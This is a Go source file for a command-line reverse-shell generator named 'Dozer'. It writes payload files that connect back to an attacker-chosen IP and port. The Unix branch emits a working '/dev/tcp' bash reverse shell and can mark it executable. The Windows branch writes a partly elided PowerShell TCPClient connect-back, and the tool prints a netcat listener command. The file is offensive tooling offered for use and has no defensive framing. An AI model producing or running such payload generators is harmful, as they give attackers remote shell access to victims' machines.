package main

import (
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

type Dozer struct {
	IP         string
	Port       int
	OS         string
	Output     string
	Listener   bool
	Executable bool
}

func NewDozer(ip string, port int, osys, output string, listener, execFlag bool) (*Dozer, error) {
	if net.ParseIP(ip) == nil {
		return nil, errors.New("invalid IP address")
	}
	if port <= 1024 || port > 65535 {
		return nil, errors.New("port must be between 1025 and 65535")
	}
	if execFlag && (osys != "linux" && osys != "mac") {
		return nil, fmt.Errorf("cannot make %s shell executable", osys)
	}

	return &Dozer{
		IP:         ip,
		Port:       port,
		OS:         osys,
		Output:     output,
		Listener:   listener,
		Executable: execFlag,
	}, nil
}

func (d *Dozer) Create() {
	fmt.Println("Creating Dozer reverse shell")
	fmt.Println("-------------")
	fmt.Printf("IP: %s\nPort: %d\nOS: %s\n", d.IP, d.Port, d.OS)
	fmt.Println("-------------")
	time.Sleep(1 * time.Second)

	switch d.OS {
	case "windows":
		fmt.Printf("Generating Windows reverse shell: %s.ps1\n", d.Output)
		d.createWindowsShell()
	case "linux", "mac":
		fmt.Printf("Generating %s reverse shell: %s.sh\n", d.OS, d.Output)
		d.createUnixShell()
	case "android":
		fmt.Println("Android reverse shell not implemented yet.")
	case "ios":
		fmt.Println("iOS reverse shell not implemented yet.")
	default:
		fmt.Println("Unsupported OS")
	}

	if d.Listener {
		fmt.Println("//LOG: Starting listener (stub)")
		d.startListener()
	}
}

func (d *Dozer) createWindowsShell() {
	shell := fmt.Sprintf(`[...]
$TCPClient = New-Object Net.Sockets.TCPClient("%s", %d)
$NetworkStream = $TCPClient.GetStream()
[...]
`, d.IP, d.Port)

	err := os.WriteFile(d.Output+".ps1", []byte(shell), 0644)
	if err != nil {
		fmt.Println("Error writing file:", err)
		return
	}
	fmt.Printf("//LOG: Created %s.ps1\n", d.Output)
}

func (d *Dozer) createUnixShell() {
	script := fmt.Sprintf("sh -i >& /dev/tcp/%s/%d 0>&1\n", d.IP, d.Port)

	filePath := d.Output + ".sh"
	err := os.WriteFile(filePath, []byte(script), 0755)
	if err != nil {
		fmt.Println("Error writing shell script:", err)
		return
	}
	fmt.Printf("//LOG: Created %s\n", filePath)

	if d.Executable {
		fmt.Println("//LOG: Making shell executable")
		err := exec.Command("chmod", "+x", filePath).Run()
		if err != nil {
			fmt.Println("Failed to make script executable:", err)
			return
		}
		fmt.Println("//LOG: Reverse shell is now executable!")
	}
}

func (d *Dozer) startListener() {
	fmt.Println("Listener not implemented — consider using netcat manually:")
	fmt.Printf("nc -lvnp %d\n", d.Port)
}

func main() {
	ip := flag.String("ip", "", "IP address to connect back to (required)")
	port := flag.Int("port", 0, "Port to connect back to (required)")
	output := flag.String("output", "rev_shell", "Output file name")
	listener := flag.Bool("listener", false, "Start listener after creating shell")
	execFlag := flag.Bool("exec", false, "Make shell executable (only for linux/mac)")
	osys := flag.String("os", "", "Target OS (windows/linux/mac/android/ios)")

	flag.Parse()

	if *ip == "" || *port == 0 || *osys == "" {
		fmt.Println("Missing required flags. Use -h for help.")
		os.Exit(1)
	}

	dozer, err := NewDozer(*ip, *port, strings.ToLower(*osys), *output, *listener, *execFlag)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}

	dozer.Create()
}
